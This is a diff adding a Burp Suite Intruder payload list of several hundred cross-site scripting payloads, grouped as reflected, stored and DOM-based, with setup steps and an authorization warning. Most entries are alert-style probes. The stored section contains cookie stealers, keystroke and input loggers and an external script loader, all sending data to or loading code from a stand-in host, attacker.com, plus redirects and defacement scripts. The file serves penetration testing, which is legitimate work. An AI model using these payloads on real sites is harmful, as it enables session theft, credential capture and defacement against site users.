@@ -1,0 +1,496 @@
+# ============================================================================
+# BURP SUITE INTRUDER PAYLOAD LIST
+# Tool    : XSS Payload Generator
+# Author  : Offensive Team Zeta - ITSOLERA (PVT) LTD
+# Created : 2026-02-20 18:30:04
+# Usage   : Burp Suite > Intruder > Payloads > Load > (this file)
+# WARNING : Use ONLY on authorized targets with written permission
+# ============================================================================
+
+# HOW TO USE:
+#   1. Open Burp Suite → Proxy → Intercept a request
+#   2. Right-click → Send to Intruder
+#   3. Intruder → Positions → mark your injection point (Add §)
+#   4. Intruder → Payloads → Payload type: Simple list
+#   5. Click Load → select this file
+#   6. Click Start Attack (authorized lab / DVWA ONLY)
+
+# ============================================================================
+# REFLECTED XSS PAYLOADS
+# ============================================================================
+# [High] Basic script tag injection
+<script>alert('XSS')</script>
+# [High] Minimal script alert
+<script>alert(1)</script>
+# [High] Display current domain
+<script>alert(document.domain)</script>
+# [Critical] Display cookies
+<script>alert(document.cookie)</script>
+# [High] Confirm dialog box
+<script>confirm('XSS')</script>
+# [High] Prompt dialog box
+<script>prompt('XSS')</script>
+# [High] Display window origin
+<script>alert(window.origin)</script>
+# [High] Display document URL
+<script>alert(document.URL)</script>
+# [High] Script without closing tag
+<script>alert('XSS')//
+# [High] Script with data URI
+<script src=data:,alert(1)>
+# [High] Image tag with onerror event
+<img src=x onerror=alert('XSS')>
+# [High] Minimal image onerror
+<img src=x onerror=alert(1)>
+# [High] Image tag with onload event
+<img src=x onload=alert('XSS')>
+# [High] Image with prompt dialog
+<img src=x onerror=prompt('XSS')>
+# [High] Image without src value
+<img src onerror=alert('XSS')>
+# [High] Image with invalid src
+<img src=/ onerror=alert('XSS')>
+# [High] Image with javascript protocol
+<img src=javascript:alert('XSS')>
+# [Medium] Image with dynsrc attribute
+<img dynsrc=javascript:alert('XSS')>
+# [Medium] Image with lowsrc attribute
+<img lowsrc=javascript:alert('XSS')>
+# [High] Image with quoted attributes
+<img src='x' onerror='alert(1)'>
+# [High] Image with slash separator
+<img/src=x onerror=alert(1)>
+# [High] Image with eval in onerror
+<img src=x:alert(1) onerror=eval(src)>
+# [High] SVG tag with onload event
+<svg onload=alert('XSS')>
+# [High] Minimal SVG onload
+<svg onload=alert(1)>
+# [High] SVG with embedded script
+<svg><script>alert('XSS')</script></svg>
+# [Medium] SVG animate with onbegin
+<svg><animate onbegin=alert('XSS')>
+# [Medium] SVG set attribute
+<svg><set attributeName=onmouseover to=alert(1)>
+# [High] SVG with slash separator
+<svg/onload=alert(1)>
+# [High] SVG with template literals
+<svg onload=alert`1`>
+# [Medium] SVG animatetransform
+<svg><animatetransform onbegin=alert(1)>
+# [High] SVG title with script
+<svg><title><script>alert(1)</script></title>
+# [High] SVG desc with script
+<svg><desc><script>alert(1)</script></desc>
+# [High] SVG foreignObject
+<svg><foreignObject><script>alert(1)</script></foreignObject>
+# [High] MathML with script
+<math><mtext><script>alert(1)</script></mtext>
+# [Medium] SVG animated href
+<svg><a><animate attributeName=href values=javascript:alert(1)><text x=20 y=20>Click</text></a>
+# [High] SVG script with HTML entities
+<svg><script>alert&#40;1&#41;</script>
+# [High] SVG with namespace
+<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>
+# [High] Iframe with javascript protocol
+<iframe src=javascript:alert('XSS')>
+# [High] Iframe with onload event
+<iframe onload=alert('XSS')>
+# [High] Iframe with srcdoc attribute
+<iframe srcdoc='<script>alert(1)</script>'>
+# [High] Iframe with data URI
+<iframe src=data:text/html,<script>alert(1)</script>>
+# [High] Iframe with confirm
+<iframe src=javascript:confirm(1)>
+# [High] Iframe with prompt
+<iframe src=javascript:prompt(1)>
+# [High] Iframe with entity encoding
+<iframe src=j&#x61;vascript:alert(1)>
+# [High] Iframe with slash separator
+<iframe/src=javascript:alert(1)>
+# [Medium] Body tag with onload event
+<body onload=alert('XSS')>
+# [Medium] Body tag with onpageshow
+<body onpageshow=alert('XSS')>
+# [Medium] Body with onhashchange
+<body onhashchange=alert('XSS')>
+# [Medium] Body with onfocus
+<body onfocus=alert('XSS')>
+# [Low] Body with onresize
+<body onresize=alert('XSS')>
+# [Low] Body with onscroll
+<body onscroll=alert('XSS')>
+# [High] Input with autofocus and onfocus
+<input onfocus=alert('XSS') autofocus>
+# [Medium] Input with blur event
+<input onblur=alert('XSS') autofocus><input autofocus>
+# [Medium] Select with autofocus
+<select onfocus=alert('XSS') autofocus>
+# [Medium] Textarea with autofocus
+<textarea onfocus=alert('XSS') autofocus>
+# [Medium] Button with onclick
+<button onclick=alert('XSS')>Click
+# [High] Button with formaction
+<form><button formaction=javascript:alert(1)>Click
+# [High] Submit with formaction
+<input type=submit formaction=javascript:alert(1)>
+# [High] Image input with onerror
+<input type=image src=x onerror=alert(1)>
+# [Medium] Search input with onsearch
+<form><input type=search onsearch=alert(1) autofocus>
+# [Low] Keygen with autofocus
+<keygen onfocus=alert(1) autofocus>
+# [Medium] Details tag with ontoggle
+<details open ontoggle=alert('XSS')>
+# [Medium] Details with summary
+<details ontoggle=alert('XSS')><summary>click</summary>
+# [High] Details with iframe
+<details><summary>click</summary><iframe src=javascript:alert(1)>
+# [Medium] Dialog with onclose
+<dialog open>XSS</dialog><script>document.querySelector('dialog').onclose=alert(1)</script>
+# [Low] Marquee with onstart event
+<marquee onstart=alert('XSS')>
+# [High] Object with javascript protocol
+<object data=javascript:alert('XSS')>
+# [High] Embed with javascript protocol
+<embed src=javascript:alert('XSS')>
+# [High] Object with data URI
+<object data=data:text/html,<script>alert(1)</script>>
+# [High] Embed with data URI
+<embed src=data:text/html,<script>alert(1)</script>>
+# [High] Object with Flash SWF
+<object data='//attacker.com/xss.swf'>
+# [High] Embed with code attribute
+<embed code=javascript:alert(1)>
+# [Medium] Applet with code
+<applet code=javascript:alert(1)>
+# [High] Base tag hijack
+<base href=javascript:alert(1)//>
+# [Medium] Video source with onerror
+<video><source onerror=alert('XSS')>
+# [Medium] Audio with onerror
+<audio src=x onerror=alert('XSS')>
+# [Medium] Video with onerror
+<video src=x onerror=alert(1)>
+# [Medium] Audio with onloadstart
+<audio onloadstart=alert(1)>
+# [Medium] Video with poster
+<video poster=javascript:alert(1)>
+# [High] Video track XSS
+<video><track kind=subtitles src=data:text/vtt,WEBVTT default>
+# [Medium] Link with CSS expression
+<link rel=stylesheet href=data:,*%7Bx:expression(alert(1))%7D>
+# [Medium] Style with CSS expression
+<style>*{x:expression(alert(1))}</style>
+# [Medium] Style import javascript
+<style>@import'javascript:alert(1)';</style>
+# [High] Meta refresh with javascript
+<meta http-equiv=refresh content='0;url=javascript:alert(1)'>
+# [Low] Bgsound with javascript
+<bgsound src=javascript:alert(1)>
+# [Medium] Frameset with onload
+<frameset onload=alert(1)>
+# [Low] Table background javascript
+<table background=javascript:alert(1)>
+# [Medium] Anchor with javascript protocol
+<a href=javascript:alert(1)>click
+# [High] Form with javascript action
+<form action=javascript:alert(1)><input type=submit>
+# [Low] Isindex formaction
+<isindex type=submit value=XSS formaction=javascript:alert(1)>
+# [High] Break out of attribute with onload
+" onload="alert('XSS')
+# [High] Onfocus with autofocus attribute
+" onfocus="alert('XSS')" autofocus="
+# [Medium] Onmouseover event handler
+" onmouseover="alert('XSS')
+# [Medium] Onclick event handler
+" onclick="alert('XSS')
+# [High] Onerror event handler
+" onerror="alert('XSS')
+# [Medium] Onanimationend event
+" onanimationend="alert('XSS')
+# [Medium] Ontransitionend event
+" ontransitionend="alert('XSS')
+# [Medium] Ondrag event handler
+" ondrag="alert('XSS')
+# [Medium] Ondrop event handler
+" ondrop="alert('XSS')
+# [Medium] Onchange event handler
+" onchange="alert('XSS')
+# [Low] Onwheel event handler
+" onwheel="alert('XSS')
+# [High] Onsubmit event handler
+" onsubmit="alert('XSS')
+# [Medium] Oninput event handler
+" oninput="alert('XSS')
+# [Medium] Onsearch event handler
+" onsearch="alert('XSS')
+# [Medium] Onkeydown event handler
+" onkeydown="alert('XSS')
+# [High] Close tag and inject script
+"><script>alert('XSS')</script>
+# [High] Close tag and inject image
+"><img src=x onerror=alert('XSS')>
+# [High] Close tag and inject SVG
+"><svg onload=alert('XSS')>
+# [High] Close tag and inject iframe
+"><iframe src=javascript:alert('XSS')>
+# [Medium] Close tag and inject body
+"><body onload=alert('XSS')>
+# [High] Close tag and inject input
+"><input onfocus=alert('XSS') autofocus>
+# [Medium] Close tag and inject video
+"><video src=x onerror=alert('XSS')>
+# [Medium] Close tag and inject audio
+"><audio src=x onerror=alert('XSS')>
+# [High] Close tag and inject object
+"><object data=javascript:alert('XSS')>
+# [High] Close tag and inject embed
+"><embed src=javascript:alert('XSS')>
+# [High] Single quote breakout
+' onload='alert("XSS")'
+# [High] Single quote with autofocus
+' onfocus='alert("XSS")' autofocus='
+# [Medium] Single quote onclick
+' onclick='alert("XSS")'
+# [High] Single quote onerror
+' onerror='alert("XSS")'
+# [Medium] Single quote onmouseover
+' onmouseover='alert("XSS")'
+# [High] Single quote tag close
+'><script>alert("XSS")</script>
+# [High] Single quote image inject
+'><img src=x onerror=alert("XSS")>
+# [High] Single quote SVG inject
+'><svg onload=alert("XSS")>
+# [High] Break out of string with semicolon
+'; alert('XSS'); //
+# [High] Break out with double quotes
+"; alert("XSS"); //
+# [High] Character code obfuscation
+';alert(String.fromCharCode(88,83,83));//
+# [High] Regular expression in alert
+';alert(/XSS/);//
+# [High] Template literal injection
+`;alert`1`;//
+# [High] Backslash escape attempt
+\';alert(1);//
+# [High] Alert domain from string
+';alert(document.domain);//
+# [High] Confirm dialog
+';confirm(1);//
+# [High] Prompt dialog
+';prompt(1);//
+# [High] Eval function call
+';eval('alert(1)');//
+# [High] SetTimeout injection
+';setTimeout('alert(1)',0);//
+# [High] SetInterval injection
+';setInterval('alert(1)',0);//
+# [Medium] Break out of multi-line comment
+*/; alert('XSS'); /*
+# [Medium] HTML comment escape
+<!--*/; alert('XSS'); //-->
+# [High] Newline comment bypass
+//
+alert('XSS');//
+# [High] Empty comment bypass
+/**/alert(1);//
+# [Medium] MySQL-style comment
+/*!alert(1)*/
+# [Medium] Double comment escape
+//*/alert(1);//
+# [Medium] Close function and inject
+}; alert('XSS'); //
+# [Medium] Close parenthesis and inject
+); alert('XSS'); //
+# [Medium] Close array and inject
+]; alert('XSS'); //
+# [Medium] Close nested structures
+});alert('XSS');//
+# [Medium] Break statement injection
+break;alert('XSS');//
+# [Medium] Return statement injection
+return;alert('XSS');//
+
+# ============================================================================
+# STORED XSS PAYLOADS
+# ============================================================================
+# [Critical] Cookie stealer using fetch API
+<script>fetch('http://attacker.com?c='+document.cookie)</script>
+# [Critical] Cookie stealer using image error
+<img src=x onerror='location="http://attacker.com?c="+document.cookie'>
+# [Critical] Cookie stealer using Image object
+<script>new Image().src='http://attacker.com?c='+document.cookie</script>
+# [Critical] SVG-based cookie stealer
+<svg onload='fetch("http://attacker.com?c="+document.cookie)'>
+# [Critical] Cookie stealer using sendBeacon
+<script>navigator.sendBeacon('http://attacker.com',document.cookie)</script>
+# [Critical] Cookie stealer using location
+<script>document.location='http://attacker.com?c='+document.cookie</script>
+# [Critical] Iframe cookie stealer
+<iframe src=x onload="fetch('http://attacker.com?c='+parent.document.cookie)">
+# [Critical] External script loader
+<script>with(document)with(body)with(appendChild(createElement('script')))src='//attacker.com'</script>
+# [Critical] Simple keylogger
+<script>document.onkeypress=function(e){fetch('http://attacker.com?k='+e.key)}</script>
+# [Critical] Keydown event logger
+<script>document.addEventListener('keydown',e=>fetch('//attacker.com?k='+e.key))</script>
+# [Critical] Input value logger
+<script>setInterval(()=>fetch('//attacker.com?v='+document.querySelector('input').value),1000)</script>
+# [Critical] Multi-input logger
+<script>document.querySelectorAll('input').forEach(i=>i.addEventListener('input',e=>fetch('//attacker.com?'+e.target.value)))</script>
+# [High] Page redirect
+<script>window.location='http://attacker.com'</script>
+# [High] Meta refresh redirect
+<meta http-equiv='refresh' content='0;url=http://attacker.com'>
+# [High] Top frame redirect
+<script>top.location='http://attacker.com'</script>
+# [High] Parent frame redirect
+<script>parent.location='http://attacker.com'</script>
+# [High] Window.open redirect
+<script>window.open('http://attacker.com','_self')</script>
+# [High] Location.replace redirect
+<script>location.replace('http://attacker.com')</script>
+# [High] Page defacement
+<script>document.body.innerHTML='<h1>Hacked!</h1>'</script>
+# [High] Document.write defacement
+<script>document.write('<h1>Defaced</h1>')</script>
+# [Medium] Background color change
+<script>document.body.style.background='red'</script>
+# [Low] Title change
+<script>document.title='Hacked by XSS'</script>
+# [High] Body removal
+<script>alert('XSS');document.body.remove()</script>
+# [Medium] CSS-based hiding
+<style>body{display:none}</style><h1>Hacked</h1>
+# [High] Simple stored XSS
+<img src=x onerror=alert('Stored XSS')>
+# [High] SVG stored XSS
+<svg onload=alert('Stored XSS')>
+# [High] Iframe stored XSS
+<iframe src=javascript:alert('Stored')>
+# [High] Basic stored script
+<script>alert('Stored')</script>
+# [Medium] Body onload stored
+<body onload=alert('Stored')>
+# [High] Input stored XSS
+<input onfocus=alert('Stored') autofocus>
+# [Low] Marquee stored XSS
+<marquee onstart=alert('Stored')>
+# [Medium] Details stored XSS
+<details open ontoggle=alert('Stored')>
+# [Medium] Video stored XSS
+<video src=x onerror=alert('Stored')>
+# [Medium] Audio stored XSS
+<audio src=x onerror=alert('Stored')>
+# [Medium] Select stored XSS
+<select onfocus=alert('Stored') autofocus>
+# [Medium] Textarea stored XSS
+<textarea onfocus=alert('Stored') autofocus>
+# [High] Object stored XSS
+<object data=javascript:alert('Stored')>
+# [High] Embed stored XSS
+<embed src=javascript:alert('Stored')>
+# [Medium] Button stored XSS
+<button onclick=alert('Stored')>Click</button>
+# [High] Form stored XSS
+<form action=javascript:alert('Stored')><input type=submit>
+# [Medium] Link CSS stored
+<link rel=stylesheet href=data:,*%7Bx:expression(alert('Stored'))%7D>
+# [High] Base tag stored
+<base href=javascript:alert('Stored')//>
+# [Critical] Attribute-based cookie stealer
+" onfocus="fetch('http://attacker.com?c='+document.cookie)" autofocus="
+# [Critical] Break out and steal cookie
+"><img src=x onerror="location='http://attacker.com?c='+document.cookie">
+# [High] Stored onclick handler
+" onclick="alert('Stored XSS')
+# [High] Stored onload handler
+" onload="alert('Stored')
+# [High] Stored onerror handler
+" onerror="alert('Stored')
+# [Medium] Stored onmouseover
+" onmouseover="alert('Stored')
+# [High] Single quote stored onclick
+' onclick='alert("Stored")'
+# [High] Single quote tag injection
+'><script>alert("Stored")</script>
+# [High] Autofocus attribute attack
+" autofocus onfocus="alert(1)
+# [Medium] CSS expression attack
+" style="x:expression(alert(1))"
+# [Critical] JS context cookie stealer
+'; fetch('http://attacker.com?c='+document.cookie); //
+# [High] JS context redirect
+"; window.location="http://attacker.com"; //
+# [High] Document.write injection
+';document.write('<img src=x onerror=alert(1)>');//
+# [High] Base64 eval injection
+';eval(atob('YWxlcnQoMSk='));//
+# [High] SetTimeout stored
+';setTimeout(alert(1),0);//
+# [High] Function constructor
+';Function('alert(1)')();//
+# [High] Unicode escape
+';\u0061lert(1);//
+# [High] CharCode stored
+';alert(String.fromCharCode(88,83,83));//
+
+# ============================================================================
+# DOM XSS PAYLOADS
+# ============================================================================
+# [High] DOM-based XSS showing domain
+<img src=x onerror=alert(document.domain)>
+# [High] Hash fragment injection
+#<script>alert('DOM XSS')</script>
+# [Medium] Show current location
+<svg onload=alert(window.location)>
+# [Medium] Display document URL
+<img src=x onerror=alert(document.URL)>
+# [High] Break out for DOM manipulation
+"><svg onload=alert(1)>
+# [Medium] Display referrer
+<img src=x onerror=alert(document.referrer)>
+# [Medium] Display hash
+<img src=x onerror=alert(location.hash)>
+# [Medium] Display search params
+<img src=x onerror=alert(location.search)>
+# [Medium] Display base URI
+<img src=x onerror=alert(document.baseURI)>
+# [High] Alert href
+<script>alert(location.href)</script>
+# [High] Alert document URI
+<script>alert(document.documentURI)</script>
+# [High] Parent domain access
+<iframe src=javascript:alert(parent.document.domain)>
+# [Critical] Eval from hash
+<img src=x onerror=eval(location.hash.slice(1))>
+# [Critical] Base64 hash eval
+<img src=x onerror=eval(atob(location.hash.slice(1)))>
+# [High] Write hash to document
+<img src=x onerror=document.write(location.hash)>
+# [High] DOM attribute injection
+" onload="alert(document.domain)
+# [High] DOM-based attribute XSS
+" onfocus="alert(document.URL)" autofocus="
+# [High] DOM onclick href
+" onclick="alert(location.href)
+# [High] DOM onerror hash
+" onerror="alert(location.hash)
+# [High] Single quote DOM attack
+'onclick='alert(document.domain)'
+# [High] DOM image injection
+"><img src=x onerror=alert(document.URL)>
+# [High] JavaScript protocol handler
+javascript:alert(document.domain)
+# [Critical] JavaScript protocol cookie access
+javascript:alert(document.cookie)
+# [High] JavaScript protocol href
+javascript:alert(location.href)
+# [High] JavaScript void function
+javascript:void(alert(document.domain))
+# [High] Data URI DOM access
+data:text/html,<script>alert(parent.document.domain)</script>
+
